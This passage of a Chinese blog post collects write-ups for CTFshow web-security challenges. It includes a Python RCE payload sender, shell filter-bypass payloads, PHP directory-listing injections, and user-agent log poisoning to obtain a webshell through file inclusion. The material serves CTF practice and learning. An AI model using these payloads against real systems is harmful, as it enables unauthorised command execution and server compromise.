class="line">    exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]<span class="comment">#根据用户输入的值，进行URL赋值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">act</span>):<span class="comment">#查询并合成新字符函数</span></span><br><span class="line">    s1=<span class="string">&quot;&quot;</span></span><br><span class="line">    s2=<span class="string">&quot;&quot;</span></span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> act:</span><br><span class="line">        f.seek(<span class="number">0</span>)   <span class="comment">#让每一次文件都从头开始查找</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            Acm=line</span><br><span class="line">            <span class="comment"># Acm=line.split(&quot; &quot;)   //不能用用空格分隔，有些未被过滤的字符也被分隔了</span></span><br><span class="line">            cm=Acm[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> cm==i:</span><br><span class="line">                s1+=Acm[<span class="number">2</span>:<span class="number">5</span>]<span class="comment">#从第2个开始读取到第4个</span></span><br><span class="line">                s2+=Acm[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span><span class="comment">#括号引起来的操作，方便进行或运算(&quot;s1&quot;|&quot;s2&quot;)</span></span><br><span class="line">    <span class="built_in">print</span>(output)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param=action(<span class="built_in">input</span>(<span class="string">&quot;RCE_function:&quot;</span>))+action(<span class="built_in">input</span>(<span class="string">&quot;Command:&quot;</span>))</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)<span class="comment">#这里必须用URL解码，不然浏览器会对数据再一次URL编码</span></span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Web41_flag:\n<span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;这里systemls不用加;(分号)，最开始进行按位或运算，已经把这段代码当作php代码执行了&#x3D;&#x3D;</p><p><strong>对上面一些函数的解释</strong></p><h6 id="argv"><a href="#argv" class="headerlink" title="argv"></a>argv</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">argv是sys库的一个函数</span><br><span class="line">argv[0]：脚本名argv[1]:用户输入的第一个参数</span><br></pre></td></tr></table></figure><h6 id="urllib-parse-unquote"><a href="#urllib-parse-unquote" class="headerlink" title="urllib.parse.unquote"></a>urllib.parse.unquote</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对参数进行URL解码</span><br></pre></td></tr></table></figure><h3 id="web-42"><a href="#web-42" class="headerlink" title="web-42"></a>web-42</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">采用将命令输出重定向的黑洞(/dev/null)的过滤</span><br><span class="line">我们可以采用命令分隔符把后面的命令重定向，前面的命令照常输出</span><br></pre></td></tr></table></figure><h4 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; //分号</span><br><span class="line">| //只执行后面那条命令</span><br><span class="line">|| //只执行前面那条命令</span><br><span class="line">&amp; //两条命令都会执行</span><br><span class="line">&amp;&amp; //两条命令都会执行</span><br></pre></td></tr></table></figure><h3 id="web-43-44"><a href="#web-43-44" class="headerlink" title="web-43&#x2F;44"></a>web-43&#x2F;44</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">钱白花了，就是跟前面一样的cat和flag过滤，运用*或者tac就可以绕过了</span><br></pre></td></tr></table></figure><h3 id="web-45"><a href="#web-45" class="headerlink" title="web-45"></a>web-45</h3><p>&#x3D;&#x3D;空格绕过新知识&#x3D;&#x3D;</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;绕过：在linux下，$&#123;IFS&#125;是分隔符的意思，所以可以有$&#123;IFS&#125;进行空格的替代。</span><br><span class="line"></span><br><span class="line">$IFS$9绕过：$起截断作用，9为当前shell进程的第九个参数，始终为空字符串，所以同样能代替空字符串进行分割。</span><br></pre></td></tr></table></figure><h6 id="讲解一下这个IFS"><a href="#讲解一下这个IFS" class="headerlink" title="讲解一下这个IFS"></a>讲解一下这个IFS</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IFS在Linux中就是一个系统变量，$IFS就表示分隔符，但是单纯的cat$IFS2,无法输出，是因为系统把IFS2整体当作变量了</span><br><span class="line">所以可以使用&#123;IFS&#125;把这个变量名给固定住，cat$&#123;IFS&#125;2,成功执行</span><br><span class="line">如果&#123;&#125;被过滤则可以cat$IFS$9,$9系统变量空字符串打断IFS的变量名，cat$IFS$92,也可以成功执行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br></pre></td></tr></table></figure><h3 id="web-46-47-48-49-50-51"><a href="#web-46-47-48-49-50-51" class="headerlink" title="web-46\47\48\49\50\51"></a>web-46\47\48\49\50\51</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*号被过滤，可以用?号\号&#x27;&#x27;号替代</span><br><span class="line">cat fl?g.php</span><br><span class="line">cat fla\g.php</span><br><span class="line">cat flag&#x27;&#x27;g.php</span><br><span class="line"></span><br><span class="line">如果cat被过滤</span><br><span class="line">ca&#x27;&#x27;t flag.php</span><br><span class="line">ca\t flag.php</span><br><span class="line"></span><br><span class="line">其他的跟前面一样</span><br></pre></td></tr></table></figure><h3 id="web-52-53-54"><a href="#web-52-53-54" class="headerlink" title="web-52\53\54"></a>web-52\53\54</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这题阴了一手，过滤还是常规过滤，但是flag在根目录下</span><br><span class="line">补充：</span><br><span class="line">ls如果展开是一个路径的话，说明这个东西是一个文件</span><br></pre></td></tr></table></figure><h3 id="web-55-56"><a href="#web-55-56" class="headerlink" title="web-55&#x2F;56"></a>web-55&#x2F;56</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">由于题目没有过滤掉数字,所以才用linux自带的base64编码输出，将flag输出</span><br><span class="line">payload:</span><br><span class="line">?c=/???/????64 ????.???</span><br><span class="line">意思为：?c=/bin/base64 flag.php</span><br><span class="line"></span><br><span class="line">?c=/???/???/????2 ????.???</span><br><span class="line">意思为：?c=/usr/bin/bzip2 flag.php</span><br><span class="line"></span><br><span class="line">最后访问url/flag.php.bz2即可</span><br></pre></td></tr></table></figure><p>还可以通过$命令执行</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;...&#x27; 是 Bash 中的一个特性，表示支持特殊字符（比如通过八进制、十六进制或 Unicode 字符）的字符串。</span><br><span class="line">payload:</span><br><span class="line">$&#x27;\164\141\143&#x27; $&#x27;\146\154\141\147\56\160\150\160&#x27;</span><br><span class="line">意思是：tac flag.php</span><br></pre></td></tr></table></figure><h4 id="bin-sh命令执行"><a href="#bin-sh命令执行" class="headerlink" title="&#x2F;bin&#x2F;sh命令执行"></a>&#x2F;bin&#x2F;sh命令执行</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">因为在linux里面.就代表sh命令</span><br><span class="line">sh命令我们就理解为打开终端</span><br><span class="line">然后我们自己上传一个文件，这个文件会产生一个临时文件在tmp目录下</span><br><span class="line">我们用sh命令打开这个临时文件，文件内容就是命令输入，这样就会造成sh执行注入命令</span><br></pre></td></tr></table></figure><p>首先拿到这个网页的文件上传模板，先构造一个文件上传，然后burp抓包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://4db3939d-5503-445b-9328-124df867dd3e.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="D:\Blog\blog\source\images\UploadMode.png" alt="图片上传模板"></p><p>然后通过修改这个数据包，达到命令执行</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">构造GET参数payload为：</span><br><span class="line">?c=.%20/???/????????[@-[]</span><br><span class="line">意思为：?c=. /tmp/D.phpphpXXX//tmp目录会保留D.phpphp的临时文件后面是随机字母</span><br><span class="line">文件名直接全部用?替代</span><br><span class="line">网页文件tmp目录大以phpXXX结尾</span><br><span class="line">也有可能是小写字母，所以没回显的话，需要多尝试，[@-[]表示@到[之间的字符，这里是包括有所有大写字母</span><br><span class="line"></span><br><span class="line">构造POST参数payload为：</span><br><span class="line">#!/bin/sh</span><br><span class="line">cat flag.php</span><br></pre></td></tr></table></figure><h3 id="web-57"><a href="#web-57" class="headerlink" title="web-57"></a>web-57</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这题属于知识拓展,$(())=0,$((~$(())))=-1,里面默认式子相加也就是</span><br><span class="line">$((~$(()))~$(()))))=-1+(-1)=-2</span><br><span class="line">这题要我们构造出36也就是将-37进行取反，他这里取反会少一，原理是二进制的按位取反</span><br><span class="line">这里我们采用多在虚拟机上实验</span><br><span class="line">然后用python脚本构造payload#总不能自己手打37个吧,脚本的作用就是替代重复的工作</span><br></pre></td></tr></table></figure><h3 id="web-58-59"><a href="#web-58-59" class="headerlink" title="web-58\59"></a>web-58\59</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">没有过滤include,可以使用include加php伪协议绕过</span><br><span class="line"></span><br><span class="line">使用c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;)</span><br><span class="line">renama，highlight_file,show_source这些函数都没有被过滤</span><br></pre></td></tr></table></figure><h3 id="web-60-61-62"><a href="#web-60-61-62" class="headerlink" title="web-60&#x2F;61&#x2F;62"></a>web-60&#x2F;61&#x2F;62</h3><h5 id="php扫描文件"><a href="#php扫描文件" class="headerlink" title="php扫描文件"></a>php扫描文件</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(dirname(&#x27;_FILE_&#x27;)));</span><br></pre></td></tr></table></figure><h5 id="查看目录"><a href="#查看目录" class="headerlink" title="查看目录"></a>查看目录</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(&quot;路径&quot;));</span><br><span class="line">c=print_r(scandir(&quot;..&quot;));</span><br><span class="line">c=var_dump(scandir(&quot;路径&quot;));</span><br></pre></td></tr></table></figure><h3 id="web-63"><a href="#web-63" class="headerlink" title="web-63"></a>web-63</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这道题我尝试了不同的方法，因为他没有禁用include的函数，我让他包含了/var/log/nginx/access.log的进行了UA注入，然后用蚁剑进行POST连接，成功的拿到了shell，但是这道题所有的文件打开都是空白，通过将蚁剑的代理到Burpsuite,通过抓包，发现它通过PHP fread函数读取文件内容,但是这道题使用了disable_function函数把fread函数给禁用了，所以打开文件内容是空白</span><br><span class="line">所以这道题还是通过php伪协议拿到flag</span><br></pre></td></tr></table></figure><h3 id="web-64-65-66-67-68"><a href="#web-64-65-66-67-68" class="headerlink" title="web-64&#x2F;65&#x2F;66&#x2F;67&#x2F;68"></a>web-64&#x2F;65&#x2F;66&#x2F;67&#x2F;68</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这道题flag不在当前目录下，所以需要查看目录</span><br><span class="line">c=print_r(scandir(&quot;/&quot;));</span><br></pre></td></tr></table></figure><p>有一个新的思路,通过PHP的原生类，new一个对象出来，然后echo这个对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$dir=new DirectoryIterator(&quot;/&quot;);echo $dir; </span><br></pre></td></tr></table></figure><h4 id="php中常用的原生类"><a href="#php中常用的原生类" class="headerlink" title="php中常用的原生类"></a>php中常用的原生类</h4><h5 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h5><ul><li><p><strong>作用</strong>：<code>Error</code> 类用于表示 PHP 运行时的错误。它是 <code>Throwable</code> 接口的实现类，表示如语法错误、致命错误等无法继续执行的错误。</p></li><li><p><strong>常用方法</strong>：</p><ul><li><code>getMessage()</code>：获取错误消息。</li><li><code>getCode()</code>：获取错误代码。</li><li><code>getFile()</code>：获取错误所在文件路径。</li><li><code>getLine()</code>：获取错误发生的行号。</li><li><code>getTrace()</code>：获取堆栈跟踪信息。</li><li><code>getPrevious()</code>：获取抛出此错误之前的错误。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;This is an error&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();  <span class="comment">// 输出：This is an error</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">##### Exception</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##### SoapClient</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##### DirectoryIterator</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##### FilesystemIterator</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##### SplFileObject</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##### GlobIterator</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##### SimpleXMLElement</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### web-69</span></span><br><span class="line"></span><br><span class="line">```text</span><br><span class="line">这道题把绝大多数的打印数组函数给禁用了</span><br><span class="line">所以有两种方法:</span><br><span class="line"><span class="number">1</span>.找到剩余的没有被禁用的数组函数</span><br><span class="line">c=<span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"><span class="number">2</span>.将数组转化为其他格式，再打印</span><br></pre></td></tr></table></figure></li></ul><h5 id="implode函数"><a href="#implode函数" class="headerlink" title="implode函数"></a>implode函数</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">implode 函数用于将数组的元素连接成一个字符串，数组的每个元素会根据指定的分隔符连接起来。</span><br><span class="line"></span><br><span class="line">string implode ( string $glue , array $pieces )</span><br><span class="line"></span><br><span class="line">$glue：一个字符串，作为连接数组元素的分隔符。如果你不想要任何分隔符，可以传入空字符串（&quot;&quot;）。</span><br><span class="line">$pieces：一个数组，包含要连接的元素。</span><br><span class="line"></span><br><span class="line">$array = [&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;];</span><br><span class="line">$result = implode(&quot;, &quot;, $array);</span><br><span class="line">echo $result;  // 输出：apple, banana, cherry</span><br><span class="line"></span><br><span class="line">implode($array,&quot;,&quot;);==implode(&quot;,&quot;,$array);</span><br><span class="line">逆序也可以使用</span><br></pre></td></tr></table></figure><p>所以我们先用查看当前目录或者其他目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;--&quot;</span>,<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>)));</span><br></pre></td></tr></table></figure><p>也可以转成json格式使用json_encode函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>)); </span><br></pre></td></tr></table></figure><p>然后读取文件include或者readgzfile</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web-78"><a href="#web-78" class="headerlink" title="web-78"></a>web-78</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常规文件包含命令执行，和上面差不多</span><br></pre></td></tr></table></figure><h3 id="web-79"><a href="#web-79" class="headerlink" title="web-79"></a>web-79</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">跟常规的命令执行一样，伪协议或者UA注入</span><br><span class="line"></span><br><span class="line">但是wp给了一个新的方法</span><br><span class="line">远程加载，先用file=https://www.baidu.com/robots.txt</span><br><span class="line">发现可以正常读取，那我们搞一个，自己网站的命令执行文件,然后file参数传入成功进行远程命令执行</span><br></pre></td></tr></table></figure><h3 id="web-88"><a href="#web-88" class="headerlink" title="web-88"></a>web-88</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data伪协议，UA注入</span><br></pre></td></tr></table></figure><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="web-89"><a href="#web-89" class="headerlink" title="web-89"></a>web-89</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数组绕过intval，空数组intval返回0，有参数组返回1</span><br><span class="line">url数组传参是：?num[]=s</span><br><span class="line">解析为num这个数组有s这个元素，不是?num=array(&#x27;s&#x27;)这样传入的只是一个字符串</span><br></pre></td></tr></table></figure><h3 id="web-90"><a href="#web-90" class="headerlink" title="web-90"></a>web-90</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">intval自定义进制强比较绕过</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)</span><br><span class="line"></span><br><span class="line">可以通过intval函数自定义进制,取反,算数运算符</span><br><span class="line"><span class="number">4476</span>=<span class="number">0x117c</span>,<span class="number">4476</span>=<span class="number">010574</span>,<span class="number">4476</span>=+<span class="number">4476</span>,</span><br><span class="line"><span class="number">4476</span>=~~<span class="number">4476</span>(这个绕过不一定成功，因为，GET请求读取参数会把参数转变成字符串),</span><br><span class="line"><span class="number">4476</span>=<span class="number">4476e0</span>,<span class="number">4476</span>=<span class="number">4476</span>abc,</span><br><span class="line"><span class="number">4476</span>=<span class="number">2238</span>*<span class="number">2</span>(这个绕过不一定成功，因为，GET请求读取参数会把参数转变成字符串,所以只读取了<span class="number">2238</span>)</span><br></pre></td></tr></table></figure><h3 id="web-91"><a href="#web-91" class="headerlink" title="web-91"></a>web-91</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">因为这先使用了/m操作对每一行进行正则匹配，所以</span><br><span class="line">payload:</span><br><span class="line">1%0aphp</span><br></pre></td></tr></table></figure><h3 id="web-92-93-94-95"><a href="#web-92-93-94-95" class="headerlink" title="web-92&#x2F;93&#x2F;94&#x2F;95"></a>web-92&#x2F;93&#x2F;94&#x2F;95</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">同90</span><br><span class="line">可以用url编码在中间加个空格</span><br></pre></td></tr></table></figure><h3 id="web-96"><a href="#web-96" class="headerlink" title="web-96"></a>web-96</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以使用php伪协议进行绕过，</span><br><span class="line">这里进行了测试，正常读取传参的值是一个字符串。</span><br><span class="line">只有特定的函数(大部分与文件操作相关的)，才会取解析php伪协议流，例如这题highlight_file</span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="web-151"><a href="#web-151" class="headerlink" title="web-151"></a>web-151</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">前端验证，浏览器检查改代码，或者burp拦截抓包改包都行</span><br></pre></td></tr></table></figure><h3 id="web-152"><a href="#web-152" class="headerlink" title="web-152"></a>web-152</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bp抓包修改文件类型即可</span><br></pre></td></tr></table></figure><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="web-254"><a href="#web-254" class="headerlink" title="web-254"></a>web-254</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">纯读代码，钱白花了</span><br></pre></td></tr></table></figure><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="web-316"><a href="#web-316" class="headerlink" title="web-316"></a>web-316</h3><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="web-3-1"><a href="#web-3-1" class="headerlink" title="web-3"></a>web-3</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">文件包含漏洞:</span><br><span class="line">1.可以先探测一波文件包含漏洞，他直接将payload include的话，我们尝试写入/etc/passwd</span><br><span class="line">2.如果有回显的话漏洞存在，没有则无</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;蚁剑只能连http&#x3D;&#x3D;</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent 注入一句话木马（以下简称UA）如果有文件包含漏洞，则可以访问它的日志/var/log/nginx/access.log,从而拿到webshell</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;User-Agent 注入一句话木马&#x3D;&#x3D;</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 